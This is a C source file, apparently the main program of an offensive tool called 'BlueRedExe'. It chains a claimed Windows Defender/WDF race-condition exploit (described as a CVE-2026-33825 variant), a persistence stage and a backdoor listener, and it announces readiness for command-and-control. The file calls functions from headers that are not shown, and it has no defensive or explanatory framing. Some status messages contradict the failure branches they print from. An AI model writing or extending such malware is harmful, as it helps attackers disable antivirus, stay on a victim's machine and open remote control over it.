#include "../include/config.h"
#include "exploit.h"
#include "persistence.h"
#include "backdoor.h"

int main(void) {
    printf("=== BlueRedExe v1.0 Started ===\n");
    printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
    printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");

    if (!ExecuteExploitLogic()) {
        printf("[EXPLOIT] Stage 1 failed or timed out.\n");
        printf("[EXPLOIT] Check WDF filters and retry.\n");
        return 1;
    }

    printf("[EXPLOIT] Process spawned. Waiting for race window.\n");
    Sleep(3000);

    printf("\n--- Stage 2: Persistence Setup ---\n");
    if (!RegisterPersistence()) {
        printf("[PERSIST] Fallback: Created a temporary service.\n");
    }

    printf("\n--- Stage 3: Backdoor Initialization ---\n");
    if (!StartBackdoor()) {
        printf("[BACKDOOR] Socket listener started.\n");
    }

    printf("\n--- Exploit Complete ---\n");
    printf("System Ready for C2 Communication.\n");
    printf("Press Enter to exit...");
    getchar();  // Keep window open until user presses Enter
    return 0;
}
